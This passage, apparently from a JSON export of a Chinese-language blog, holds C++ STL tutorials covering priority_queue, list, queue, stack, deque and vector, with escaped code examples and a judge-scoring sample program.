pq;priority_queue&lt;int, vector&lt;int&gt;&gt; pq; pq.empty() pq.size() pq.top() pq.pop() pq.push(item) 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;#include &quot;queue&quot; void main81()&#123; priority_queue&lt;int&gt; p1; //默认是 最大值优先级队列 //priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt; &gt; p1; //相当于这样写 priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; p2; //最小值优先级队列 p1.push(33); p1.push(11); p1.push(55); p1.push(22); cout &lt;&lt;&quot;队列大小&quot; &lt;&lt; p1.size() &lt;&lt; endl; cout &lt;&lt;&quot;队头&quot; &lt;&lt; p1.top() &lt;&lt; endl; while (p1.size() &gt; 0) &#123; cout &lt;&lt; p1.top() &lt;&lt; &quot; &quot;; p1.pop(); &#125; cout &lt;&lt; endl; cout &lt;&lt; &quot;测试 最小值优先级队列&quot; &lt;&lt; endl; p2.push(33); p2.push(11); p2.push(55); p2.push(22); while (p2.size() &gt; 0) &#123; cout &lt;&lt; p2.top() &lt;&lt; &quot; &quot;; p2.pop(); &#125;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"List容器","slug":"cpp0083-List容器","date":"2021-07-05T05:52:34.000Z","updated":"2021-07-05T08:33:47.614Z","comments":true,"path":"2021/07/05/cpp0083-List容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0083-List容器/","excerpt":"","text":"List容器 list是一个双向链表容器，可高效地进行插入删除元素。 list不可以随机存取元素，所以不支持at.(pos)函数与[]操作符。It++(ok) it+5(err) #include&lt;list&gt; list对象的默认构造 123456list采用采用模板类实现,对象的默认构造形式：list&lt;T&gt; lstT; 如：list&lt;int&gt; lstInt; //定义一个存放int的list容器。list&lt;float&gt; lstFloat; //定义一个存放float的list容器。list&lt;string&gt; lstString; //定义一个存放string的list容器。... //尖括号内还可以设置指针类型或自定义类型。 list头尾的添加移除操作 1234list.push_back(elem); //在容器尾部加入一个元素list.pop_back(); //删除容器中最后一个元素list.push_front(elem); //在容器开头插入一个元素list.pop_front(); //从容器开头移除第一个元素 12345678910111213list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); lstInt.pop_front(); lstInt.pop_front(); lstInt.push_front(11); lstInt.push_front(13); lstInt.pop_back(); lstInt.pop_back();// lstInt &#123;13,11,5&#125; list的数据存取 12list.front(); //返回第一个元素。list.back(); //返回最后一个元素。 1234567891011list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); int iFront = lstInt.front(); //1 int iBack = lstInt.back(); //9 lstInt.front() = 11; //11 lstInt.back() = 19; //19 list与迭代器 1234list.begin(); //返回容器中第一个元素的迭代器。list.end(); //返回容器中最后一个元素之后的迭代器。list.rbegin(); //返回容器中倒数第一个元素的迭代器。list.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 123456789101112131415161718list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); for (list&lt;int&gt;::iterator it=lstInt.begin(); it!=lstInt.end(); ++it) &#123; cout &lt;&lt; *it; cout &lt;&lt; &quot; &quot;; &#125; for (list&lt;int&gt;::reverse_iterator rit=lstInt.rbegin(); rit!=lstInt.rend(); ++rit) &#123; cout &lt;&lt; *rit; cout &lt;&lt; &quot; &quot;; &#125; list对象的带参数构造 123list(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。list(n,elem); //构造函数将n个elem拷贝给本身。list(const list &amp;lst); //拷贝构造函数。 12345678910list&lt;int&gt; lstIntA; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); lstIntA.push_back(7); lstIntA.push_back(9); list&lt;int&gt; lstIntB(lstIntA.begin(),lstIntA.end()); //1 3 5 7 9 list&lt;int&gt; lstIntC(5,8); //8 8 8 8 8 list&lt;int&gt; lstIntD(lstIntA); //1 3 5 7 9 list的赋值 1234list.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。list.assign(n,elem); //将n个elem拷贝赋值给本身。list&amp; operator=(const list &amp;lst); //重载等号操作符list.swap(lst); // 将lst与本身的元素互换。 1234567891011list&lt;int&gt; lstIntA,lstIntB,lstIntC,lstIntD; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); lstIntA.push_back(7); lstIntA.push_back(9); lstIntB.assign(lstIntA.begin(),lstIntA.end()); //1 3 5 7 9 lstIntC.assign(5,8); //8 8 8 8 8 lstIntD = lstIntA; //1 3 5 7 9 lstIntC.swap(lstIntD); //互换 list的大小 1234list.size(); //返回容器中元素的个数list.empty(); //判断容器是否为空list.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。list.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。 123456789101112list&lt;int&gt; lstIntA; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); if (!lstIntA.empty()) &#123; int iSize = lstIntA.size(); //3 lstIntA.resize(5); //1 3 5 0 0 lstIntA.resize(7,1); //1 3 5 0 0 1 1 lstIntA.resize(2); //1 3 &#125; list的插入 123list.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。list.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。list.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值。 1234567891011121314151617list&lt;int&gt; lstA; list&lt;int&gt; lstB; lstA.push_back(1); lstA.push_back(3); lstA.push_back(5); lstA.push_back(7); lstA.push_back(9); lstB.push_back(2); lstB.push_back(4); lstB.push_back(6); lstB.push_back(8); lstA.insert(lstA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; lstA.insert(++lstA.begin(),2,33); //&#123;11,33,33,1,3,5,7,9&#125; lstA.insert(lstA.begin() , lstB.begin() , lstB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; list的删除 1234list.clear(); //移除容器的所有数据list.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。list.erase(pos); //删除pos位置的数据，返回下一个数据的位置。list.remove(elem); //删除容器中所有与elem值匹配的元素。 1234567891011121314151617181920212223242526272829303132//删除区间内的元素lstInt是用list&lt;int&gt; //声明的容器，现已包含按顺序的1,3,5,6,9元素。list&lt;int&gt;::iterator itBegin=lstInt.begin();++ itBegin;list&lt;int&gt;::iterator itEnd=lstInt.begin();++ itEnd;++ itEnd;++ itEnd;lstInt.erase(itBegin,itEnd);//此时容器lstInt包含按顺序的1,6,9三个元素。//假设 lstInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素的方法一for(list&lt;int&gt;::iterator it=lstInt.being(); it!=lstInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = lstInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除容器中等于3的元素的方法二lstInt.remove(3);//删除lstInt的所有元素lstInt.clear(); //容器为空 list的反序排列 1list.reverse(); //反转链表，比如lst包含1,3,5元素，运行此方法后，lst就包含5,3,1元素。 123456789list&lt;int&gt; lstA; lstA.push_back(1); lstA.push_back(3); lstA.push_back(5); lstA.push_back(7); lstA.push_back(9); lstA.reverse(); //9 7 5 3 1 list排序 1234567list.sort(); //默认从小到大改变规则需要提供回调函数例如比较两个int类型的回调函数bool Compare(const int&amp; x,const int&amp; y) &#123; return x &gt; y;&#125; 1234567891011121314151617181920bool Compare(const int&amp; x,const int&amp; y) &#123; return x &gt; y;&#125;void test01() &#123; list&lt;int&gt; li; li.push_back(10); li.push_back(20); li.push_back(40); li.push_back(1); li.push_back(2); li.sort(Compare); for (list&lt;int&gt;::iterator it = li.begin(); it != li.end();it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl;&#125; 一、容器deque的使用方法 ​ 适合 在头尾添加移除元素。使用方法与vector类似。 二、容器queue,stack的使用方法 ​ 适合队列，堆栈的操作方式。 三、容器list的使用方法 ​ 适合在任意位置快速插入移除元素","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"Queue容器","slug":"cpp0082-Queue容器","date":"2021-07-05T05:48:08.000Z","updated":"2021-07-05T05:52:08.004Z","comments":true,"path":"2021/07/05/cpp0082-Queue容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0082-Queue容器/","excerpt":"","text":"Queue容器 queue是队列容器，是一种“先进先出”的容器。 queue是简单地装饰deque容器而成为另外的一种容器。 #include &lt;queue&gt; queue对象的默认构造 123456queue采用模板类实现，queue对象的默认构造形式：queue&lt;T&gt; queT; 如：queue&lt;int&gt; queInt; //一个存放int的queue容器。queue&lt;float&gt; queFloat; //一个存放float的queue容器。queue&lt;string&gt; queString; //一个存放string的queue容器。... //尖括号内还可以设置指针类型或自定义类型。 queue的push()与pop()方法 12queue.push(elem); //往队尾添加元素queue.pop(); //从队头移除第一个元素 123456queue&lt;int&gt; queInt;queInt.push(1);queInt.push(3);queInt.push(5);queInt.push(7);queInt.push(9);queInt.pop();queInt.pop();此时queInt存放的元素是5,7,9 queue对象的拷贝构造与赋值 12queue(const queue &amp;que); //拷贝构造函数queue&amp; operator=(const queue &amp;que); //重载等号操作符 12345678910queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); queue&lt;int&gt; queIntB(queIntA); //拷贝构造 queue&lt;int&gt; queIntC; queIntC = queIntA; //赋值 queue的数据存取 12queue.back(); //返回最后一个元素queue.front(); //返回第一个元素 123456789101112queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); int iFront = queIntA.front(); //1 int iBack = queIntA.back(); //9 queIntA.front() = 11; //11 queIntA.back() = 19; //19 queue的大小 12queue.empty(); //判断队列是否为空queue.size(); //返回队列的大小 1234567891011queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); if (!queIntA.empty()) &#123; int iSize = queIntA.size(); //5 &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"stack容器","slug":"cpp0081-stack容器","date":"2021-07-05T05:40:14.000Z","updated":"2021-07-05T05:47:36.091Z","comments":true,"path":"2021/07/05/cpp0081-stack容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0081-stack容器/","excerpt":"","text":"stack容器 Stack简介 stack是堆栈容器，是一种“先进后出”的容器。 stack是简单地装饰deque容器而成为另外的一种容器。 #include &lt;stack&gt; stack对象的默认构造 123456stack采用模板类实现， stack对象的默认构造形式： stack &lt;T&gt; stkT; stack &lt;int&gt; stkInt; //一个存放int的stack容器。stack &lt;float&gt; stkFloat; //一个存放float的stack容器。stack &lt;string&gt; stkString; //一个存放string的stack容器。... //尖括号内还可以设置指针类型或自定义类型。 stack的push()与pop()方法 12stack.push(elem); //往栈头添加元素stack.pop(); //从栈头移除第一个元素 123456stack&lt;int&gt; stkInt; stkInt.push(1);stkInt.push(3);stkInt.pop(); stkInt.push(5);stkInt.push(7); stkInt.push(9);stkInt.pop(); stkInt.pop(); 此时stkInt存放的元素是1,5 stack对象的拷贝构造与赋值 12stack(const stack &amp;stk); //拷贝构造函数stack&amp; operator=(const stack &amp;stk); //重载等号操作符 12345678910stack&lt;int&gt; stkIntA;stkIntA.push(1);stkIntA.push(3);stkIntA.push(5);stkIntA.push(7);stkIntA.push(9);stack&lt;int&gt; stkIntB(stkIntA); //拷贝构造stack&lt;int&gt; stkIntC;stkIntC = stkIntA; //赋值 stack的数据存取 1stack.top(); //返回最后一个压入栈元素 1234567891011stack&lt;int&gt; stkIntA; stkIntA.push(1); stkIntA.push(3); stkIntA.push(5); stkIntA.push(7); stkIntA.push(9); int iTop = stkIntA.top(); //9 stkIntA.top() = 19; //19 stack的大小 12stack.empty(); //判断堆栈是否为空stack.size(); //返回堆栈的大小 1234567891011stack&lt;int&gt; stkIntA; stkIntA.push(1); stkIntA.push(3); stkIntA.push(5); stkIntA.push(7); stkIntA.push(9); if (!stkIntA.empty()) &#123; int iSize = stkIntA.size(); //5 &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"deque容器","slug":"cpp0080-STL的Deque容器","date":"2021-07-01T05:05:02.000Z","updated":"2021-07-01T11:26:35.242Z","comments":true,"path":"2021/07/01/cpp0080-STL的Deque容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/01/cpp0080-STL的Deque容器/","excerpt":"","text":"Deque简介 deque是“double-ended queue”的缩写，和vector一样都是STL的容器，deque是双端数组，而vector是单端的。 deque在接口上和vector非常相似，在许多操作的地方可以直接替换。 deque可以随机存取元素（支持索引值直接存取， 用[]操作符或at()方法，这个等下会详讲）。 deque头部和尾部添加或移除元素都非常快速。但是在中部安插元素或移除元素比较费时。 #include &lt;deque&gt; deque对象的默认构造 1234567deque采用模板类实现，deque对象的默认构造形式：deque&lt;T&gt; deqT; deque &lt;int&gt; deqInt; //一个存放int的deque容器。deque &lt;float&gt; deq Float; //一个存放float的deque容器。deque &lt;string&gt; deq String; //一个存放string的deque容器。... //尖括号内还可以设置指针类型或自定义类型。 deque末尾的添加移除操作 1234deque.push_back(elem); //在容器尾部添加一个数据deque.push_front(elem); //在容器头部插入一个数据deque.pop_back(); //删除容器最后一个数据deque.pop_front(); //删除容器第一个数据 12345678910111213deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); deqInt.pop_front(); deqInt.pop_front(); deqInt.push_front(11); deqInt.push_front(13); deqInt.pop_back(); deqInt.pop_back();//deqInt &#123; 13,11,5&#125; deque的数据存取 1234deque.at(idx); //返回索引idx所指的数据，如果idx越界，抛出out_of_range。deque[idx]; //返回索引idx所指的数据，如果idx越界，不抛出异常，直接出错。deque.front(); //返回第一个数据。deque.back(); //返回最后一个数据 12345678910111213141516deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); int iA = deqInt.at(0); //1 int iB = deqInt[1]; //3 deqInt.at(0) = 99; //99 deqInt[1] = 88; //88 int iFront = deqInt.front(); //99 int iBack = deqInt.back(); //9 deqInt.front() = 77; //77 deqInt.back() = 66; //66 deque与迭代器 1234deque.begin(); //返回容器中第一个元素的迭代器。deque.end(); //返回容器中最后一个元素之后的迭代器。deque.rbegin(); //返回容器中倒数第一个元素的迭代器。deque.rend(); //返回容器中倒数最后一个元素之后的迭代器。 1234567891011121314151617181920deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); for (deque&lt;int&gt;::iterator it=deqInt.begin(); it!=deqInt.end(); ++it) &#123; cout &lt;&lt; *it; cout &lt;&lt; &quot;&quot;; &#125; // 1 3 5 7 9 for (deque&lt;int&gt;::reverse_iterator rit=deqInt.rbegin(); rit!=deqInt.rend(); ++rit) &#123; cout &lt;&lt; *rit; cout &lt;&lt; &quot;&quot;; &#125; //9 7 5 3 1 deque对象的带参数构造 123deque(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。deque(n,elem); //构造函数将n个elem拷贝给本身。deque(const deque &amp;deq); //拷贝构造函数。 12345678910deque&lt;int&gt; deqIntA; deqIntA.push_back(1); deqIntA.push_back(3); deqIntA.push_back(5); deqIntA.push_back(7); deqIntA.push_back(9); deque&lt;int&gt; deqIntB(deqIntA.begin(),deqIntA.end()); //1 3 5 7 9 deque&lt;int&gt; deqIntC(5,8); //8 8 8 8 8 deque&lt;int&gt; deqIntD(deqIntA); //1 3 5 7 9 deque的赋值 1234deque.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。deque.assign(n,elem); //将n个elem拷贝赋值给本身。deque&amp; operator=(const deque &amp;deq); //重载等号操作符 deque.swap(deq); // 将vec与本身的元素互换 1234567891011121314deque&lt;int&gt; deqIntA,deqIntB,deqIntC,deqIntD; deqIntA.push_back(1); deqIntA.push_back(3); deqIntA.push_back(5); deqIntA.push_back(7); deqIntA.push_back(9); deqIntB.assign(deqIntA.begin(),deqIntA.end()); // 1 3 5 7 9 deqIntC.assign(5,8); //8 8 8 8 8 deqIntD = deqIntA; //1 3 5 7 9 deqIntC.swap(deqIntD); //互换 deque的大小 1234deque.size(); //返回容器中元素的个数deque.empty(); //判断容器是否为空deque.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。deque.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。 12345678910111213deque&lt;int&gt; deqIntA;deqIntA.push_back(1);deqIntA.push_back(3);deqIntA.push_back(5);int iSize = deqIntA.size(); //3if (!deqIntA.empty()) &#123; deqIntA.resize(5); //1 3 5 0 0 deqIntA.resize(7,1); //1 3 5 0 0 1 1 deqIntA.resize(2); //1 3 &#125; deque的插入 123deque.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。deque.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。deque.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值。 1234567891011121314151617deque&lt;int&gt; deqA; deque&lt;int&gt; deqB; deqA.push_back(1); deqA.push_back(3); deqA.push_back(5); deqA.push_back(7); deqA.push_back(9); deqB.push_back(2); deqB.push_back(4); deqB.push_back(6); deqB.push_back(8); deqA.insert(deqA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; deqA.insert(deqA.begin()+1,2,33); //&#123;11,33,33,1,3,5,7,9&#125; deqA.insert(deqA.begin() , deqB.begin() , deqB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; deque的删除 123deque.clear(); //移除容器的所有数据deque.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。deque.erase(pos); //删除pos位置的数据，返回下一个数据的位置。 12345678910111213141516171819202122232425删除区间内的元素deqInt是用deque&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9元素。deque&lt;int&gt;::iterator itBegin=deqInt.begin()+1;deque&lt;int&gt;::iterator itEnd=deqInt.begin()+3;deqInt.erase(itBegin,itEnd);//此时容器deqInt包含按顺序的1,6,9三个元素。假设 deqInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素for(deque&lt;int&gt;::iterator it=deqInt.being(); it!=deqInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = deqInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除deqInt的所有元素deqInt.clear(); //容器为空 基本操作代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;deque&gt;using namespace std;//deque容器初始化void test01()&#123; deque&lt;int&gt; d1; //默认构造函数 deque&lt;int&gt; d2(10,5); //带参数构造函数 deque&lt;int&gt; d3(d2.begin(),d2.end()); deque&lt;int&gt; d4(d3); //拷贝构造&#125;//deque赋值操作void test02()&#123; deque&lt;int&gt; d1(10, 3); deque&lt;int&gt; d; //d.assign(10,5); 赋值 //d.assign(d1.begin(),d1.end()); d = d1; //重载= 赋值&#125;//大小操作void test03()&#123; deque&lt;int&gt; d1(10, 3); cout &lt;&lt; d1.size() &lt;&lt; endl; if (d1.empty())&#123; cout &lt;&lt; \"空！\" &lt;&lt; endl; &#125; else&#123; cout &lt;&lt; \"不空!\" &lt;&lt; endl; &#125; //d1.resize(5); //cout &lt;&lt; d1.size() &lt;&lt; endl; d1.resize(15);&#125;//deque插入和删除void test04()&#123; deque&lt;int&gt; d; d.push_back(10); d.push_back(20); d.push_front(30); d.push_front(40); //第一种遍历方式 for (int i = 0; i &lt; d.size();i++)&#123; cout &lt;&lt; d[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //第二种遍历方式 for (int i = 0; i &lt; d.size(); i++)&#123; cout &lt;&lt; d.at(i) &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //第三种方式 for (deque&lt;int&gt;::iterator it = d.begin(); it != d.end(); it++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //删除元素 /* while (d.size() &gt; 0)&#123; cout &lt;&lt; d.back() &lt;&lt; \"被删除!\" &lt;&lt; endl; d.pop_back(); &#125; cout &lt;&lt; \"大小:\" &lt;&lt; d.size() &lt;&lt; endl; */ //头删除 while (!d.empty())&#123; cout &lt;&lt; d.front() &lt;&lt; \"被删除!\" &lt;&lt; endl; d.pop_front(); &#125;&#125;//deque容器插入void test06()&#123; deque&lt;int&gt; d; d.insert(d.begin(),100); //头插法 d.insert(d.end(), 200); //尾差法 for (deque&lt;int&gt;::iterator it = d.begin(); it != d.end(); it++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl;&#125;int main()&#123; //test03(); //test04(); test06(); system(\"pause\"); return EXIT_SUCCESS;&#125; 案例代码 sort排序第三个参数是判断规则函数 123456bool mycompare(int v1,int v2)&#123; return v1 &gt; v2; // 排序从大大小 //return v1 &lt; v2; //从小到大 &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;deque&gt;#include&lt;algorithm&gt;using namespace std;//选手类class Player&#123;public: Player(string name, int score) :name(name), score(score)&#123;&#125; string name; int score; //分数&#125;;//创建选手void Create_Player(vector&lt;Player&gt;&amp; v)&#123; string nameseed = \"ABCDE\"; for (int i = 0; i &lt; 5;i++)&#123; string name = \"选手\"; name += nameseed[i]; Player p(name,0); //创建选手 v.push_back(p); &#125;&#125;//打分bool mycompare(int v1,int v2)&#123; if (v1 &gt; v2)&#123; //从大到小 return true; &#125; else&#123; return false; &#125;&#125;void Set_Player_Score(vector&lt;Player&gt;&amp; plist)&#123; for (vector&lt;Player&gt;::iterator it = plist.begin(); it != plist.end();it++)&#123; deque&lt;int&gt; dscore; for (int i = 0; i &lt; 10;i++)&#123; int score = 50 + rand() % 50; //打分 dscore.push_back(score); &#125; //排序 sort sort(dscore.begin(), dscore.end(), mycompare); /* for (deque&lt;int&gt;::iterator it = dscore.begin(); it != dscore.end();it ++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; */ dscore.pop_front(); //去除最高分 dscore.pop_back(); //去除最低分 //分数总结 int totalscore = 0; for (deque&lt;int&gt;::iterator dit = dscore.begin(); dit != dscore.end(); dit++)&#123; totalscore += *dit; &#125; int scoreavg = totalscore / dscore.size(); (*it).score = scoreavg; &#125;&#125;//显示5名选手得分void Show_Player_Score(vector&lt;Player&gt;&amp; plist)&#123; for (vector&lt;Player&gt;::iterator it = plist.begin(); it != plist.end(); it++)&#123; cout &lt;&lt; \"姓名:\" &lt;&lt; it-&gt;name &lt;&lt; \" 分数:\" &lt;&lt; it-&gt;score &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125;int main()&#123; vector&lt;Player&gt; vPlayer; //存放我们的选手信息 Create_Player(vPlayer); //创建选手 Set_Player_Score(vPlayer); Show_Player_Score(vPlayer); //评委打分案例(sort 算法排序) //创建 5 个选手(姓名，得分)，10 个评委对 5 个选手进行打分 //得分规则：去除最高分，去除最低分，取出平均分 //按得分对 5 名选手进行排名 system(\"pause\"); return EXIT_SUCCESS;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"STL的vector容器","slug":"cpp0079-STL的vector容器","date":"2021-06-29T05:23:08.000Z","updated":"2021-06-29T06:11:06.244Z","comments":true,"path":"2021/06/29/cpp0079-STL的vector容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0079-STL的vector容器/","excerpt":"","text":"STL的vector容器 1Vector容器简介 vector是将元素置于一个动态数组中加以管理的容器。 vector可以随机存取元素（支持索引值直接存取， 用[]操作符或at()方法，这个等下会详讲）。 vector尾部添加或移除元素非常快速。但是在中部或头部插入元素或移除元素比较费时 2vector对象的默认构造 vector采用模板类实现，vector对象的默认构造形式 12345678vector&lt;T&gt; vecT; vector&lt;int&gt; vecInt; //一个存放int的vector容器。vector&lt;float&gt; vecFloat; //一个存放float的vector容器。vector&lt;string&gt; vecString; //一个存放string的vector容器。... //尖括号内还可以设置指针类型或自定义类型。Class CA&#123;&#125;;vector&lt;CA*&gt; vecpCA; //用于存放CA对象的指针的vector容器。vector&lt;CA&gt; vecCA; //用于存放CA对象的vector容器。由于容器元素的存放是按值复制的方式进行的，所以此时CA必须提供CA的拷贝构造函数，以保证CA对象间拷贝正常。 3vector对象的带参数构造 1234567891011121314vector(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。vector(n,elem); //构造函数将n个elem拷贝给本身。vector(const vector &amp;vec); //拷贝构造函数int iArray[] = &#123;0,1,2,3,4&#125;;vector&lt;int&gt; vecIntA( iArray, iArray+5 );vector&lt;int&gt; vecIntB ( vecIntA.begin() , vecIntA.end() ); //用构造函数初始化容器vecIntB vector&lt;int&gt; vecIntB ( vecIntA.begin() , vecIntA.begin()+3 ); vector&lt;int&gt; vecIntC(3,9); //此代码运行后，容器vecIntB就存放3个元素，每个元素的值是9。vector&lt;int&gt; vecIntD(vecIntA); 4vector的赋值 12345理论知识vector.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。vector.assign(n,elem); //将n个elem拷贝赋值给本身。vector&amp; operator=(const vector &amp;vec); //重载等号操作符vector.swap(vec); // 将vec与本身的元素互换。 12345678910111213vector&lt;int&gt; vecIntA, vecIntB, vecIntC, vecIntD;int iArray[] = &#123;0,1,2,3,4&#125;;vecIntA.assign(iArray,iArray+5);vecIntB.assign( vecIntA.begin(), vecIntA.end() ); //用其它容器的迭代器作参数。vecIntC.assign(3,9);vector&lt;int&gt; vecIntD;vecIntD = vecIntA;vecIntA.swap(vecIntD); 5vector的大小 12345678910理论知识vector.size(); //返回容器中元素的个数vector.empty(); //判断容器是否为空vector.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。vector.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。vi.reserve(num); //设置容量 123456例如 vecInt是vector&lt;int&gt; 声明的容器，现已包含1,2,3元素。int iSize = vecInt.size(); //iSize == 3;bool bEmpty = vecInt.empty(); // bEmpty == false;执行vecInt.resize(5); //此时里面包含1,2,3,0,0元素。再执行vecInt.resize(8,3); //此时里面包含1,2,3,0,0,3,3,3元素。再执行vecInt.resize(2); //此时里面包含1,2元素。 6vector末尾的添加移除操作 123456789vector&lt;int&gt; vecInt;vecInt.push_back(1); //在容器尾部加入一个元素vecInt.push_back(3); vecInt.push_back(5); vecInt.push_back(7); vecInt.push_back(9); vecInt.pop_back(); //移除容器中最后一个元素vecInt.pop_back();//&#123;5 ,7 ,9&#125; 7vector的数据存取 12345678910111213理论知识vec.at(idx); //返回索引idx所指的数据，如果idx越界，抛出out_of_range异常。vec[idx]; //返回索引idx所指的数据，越界时，运行直接报错vector&lt;int&gt; vecInt; //假设包含1 ,3 ,5 ,7 ,9vecInt.at(2) == vecInt[2] ; //5vecInt.at(2) = 8; 或 vecInt[2] = 8;vecInt 就包含 1, 3, 8, 7, 9值int iF = vector.front(); //iF==1int iB = vector.back(); //iB==9vector.front() = 11; //vecInt包含&#123;11,3,8,7,9&#125;vector.back() = 19; //vecInt包含&#123;11,3,8,7,19&#125; 8迭代器基本原理 迭代器是一个“可遍历STL容器内全部或部分元素”的对象。 迭代器指出容器中的一个特定位置。 迭代器就如同一个指针。 迭代器提供对一个容器中的对象的访问方法，并且可以定义了容器中对象的范围。 这里大概介绍一下迭代器的类别。 输入迭代器：也有叫法称之为“只读迭代器”，它从容器中读取元素，只能一次读入一个元素向前移动，只支持一遍算法，同一个输入迭代器不能两遍遍历一个序列。 输出迭代器：也有叫法称之为“只写迭代器”，它往容器中写入元素，只能一次写入一个元素向前移动，只支持一遍算法，同一个输出迭代器不能两遍遍历一个序列。 正向迭代器：组合输入迭代器和输出迭代器的功能，还可以多次解析一个迭代器指定的位置，可以对一个值进行多次读/写。 双向迭代器：组合正向迭代器的功能，还可以通过–操作符向后移动位置。 随机访问迭代器：组合双向迭代器的功能，还可以向前向后跳过任意个位置，可以直接访问容器中任何位置的元素。 目前本系列教程所用到的容器，都支持双向迭代器或随机访问迭代器，下面将会详细介绍这两个类别的迭代器。 9双向迭代器与随机访问迭代器 双向迭代器支持的操作： 